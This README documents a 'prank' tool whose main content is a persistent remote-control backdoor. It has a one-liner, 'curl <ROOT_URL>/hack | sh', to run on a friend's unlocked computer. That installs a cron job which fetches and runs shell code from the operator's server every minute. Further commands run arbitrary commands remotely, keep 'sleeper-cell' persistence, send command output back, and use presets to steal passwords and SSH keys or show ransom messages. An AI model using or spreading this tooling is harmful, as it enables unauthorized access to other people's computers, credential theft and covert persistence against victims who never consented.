# Hack

This project helps your hack your friends. All you need to do is wait for them to leave their computer unlocked, open up Terminal, and run a single curl command. I'll walk you through how to set it up for yourself.

## Getting Started

Clone, install, and link so you can use the `hack` cli tool.

```sh
git clone https://github.com/ccorcos/hack.git
git remote remove origin
cd hack
npm install
npm link
```

If you've never used Heroku before, [signup here](https://signup.heroku.com/) (it's free!) and set up their cli tool on your machine.

```sh
brew install heroku-toolbelt
heroku login
```

Create a Heroku app with an easy name to remember.

```sh
heroku create hacker-chet
```

The following command will get the root url for your Heroku webside and put it in your package.json. This way the server knows what to inject into the shell scripts.

```sh
npm run init
```

You can stand up the server locally if you want do you can hack yourself and test things out.

```sh
npm start
```

Or you can deploy to Heroku.

```sh
npm run deploy
```

Now you're ready to hack!

## API

The beauty of this program is that to start hacking someone, its just a one-liner!

```sh
curl <ROOT_URL>/hack | sh
```

`ROOT_URL` is the specific path to your application. When you're testing locally, this will be `localhost:5000` and when you deploy to heroku, it will be something like `<APP_NAME>.herokuapp.com`.

What this does is sets up a cron job to ping the /env/live endpoint every minute and pipes the result to `sh`. Pretty sweet right! And Heroku gives you HTTPS for free so I wouldn't be too worried about hacking yourself with it.

So once you've hacked your friend, you can do everything else with the commandline tool from your computer.

We have a concept of different hacked environments. When you hack someone using the `/hack` endpoint, that person starts off in the live environment, and there are a variety of commands you can run on each environment.

The following will rewrite the live environment shell script to execute the following command which will say aloud "I'm watching you". Classic prank, right?!

```sh
hack live exec "say 'I\'m watching you'"
```

Well its not going to work yet, you still have to redeploy to your heroku instance.

```sh
hack deploy
```

And then you can wait for the next minute and watch your buddy's computer ping your server.

```sh
hack logs
```

The whole point of environments is so you can hack multiple people at the same time. That's why you can rename the environment.

```sh
hack live rename jon
```

Next time the live env is pinged, it will rewrite the cron job to start pinging the jon environment instead. You can do everything the same just by changing the environment argument.

```sh
hack jon exec "say 'fuck you jon'"
```

Now if you've had enough fun for the day and the party's over, you can forget jon and assure him that you've "unhacked" him.

```sh
hack jon forget
```

That will erase the cron job from his computer. But if you know Jon is going to ice you again and you really hate being iced, you might just want to just put this environment in sleeper-cell mode so you can recover it later.

```sh
hack jon interval 1d
```

Now, rather than pinging your server every minute (the default), it will ping every day at midnight. And when you find that Natty Ice in your sock drawer before class, you can change the interval back to every minute and the next day, you're good for revenge!

```sh
hack jon interval 1m
```

Some other fun things to do are setting up additional cron jobs. One of the classics is the "fuck you" every hour.

```sh
hack jon cron "0 * * * * say 'fuck you jon'"
```

If you don't remember how cron jobs work, [this is a great resource](http://www.nncron.ru/help/EN/working/cron-format.htm). Its pretty much all comes down to this little diagram.

```
* * * * *
| | | | |
| | | | |
| | | | +---- Day of the Week   (range: 1-7, 1 standing for Monday)
| | | +------ Month of the Year (range: 1-12)
| | +-------- Day of the Month  (range: 1-31)
| +---------- Hour              (range: 0-23)
+------------ Minute            (range: 0-59)
```

Another good one is the 4/20 reminder.

```sh
hack jon cron "20 16 * * * * say 'its foe 20, ye better be toke-in'"
```

The computer-guy's voice is a little weird so it can help to type out some more phoenetic sounds. This one is such a classic, that I've actually made it a preset.

```sh
hack jon preset 420
```

And if you've written a ton of cronjobs and you don't know whats on there anymore, you can use the dump command.

```sh
hack jon dump "crontab -l"
```

Now whip open your logs (`hack logs`) and you'll see the stdout on the next ping. This is actually much more sinister now that you can get information back. If you really want to fuck with them, you can search for decrpyted passwords or steal their ssh keys.

```sh
hack jon preset passwords
hack jon preset ssh
```

But if you just want to give him a good old-fashioned scare, send him a ransom message!

```sh
hack jon preset ransom "Hello Jon, next time you ice me, I'll be deleting all the porn off your computer."
```

Lastly, if you find yourself adding a bunch of cronjobs and just want to start over, just give it a nice reset.

```sh
hack jon reset
```

# PS

[A nice resource on how to make a Node.js CLI app.](http://blog.npmjs.org/post/118810260230/building-a-simple-command-line-tool-with-npm)
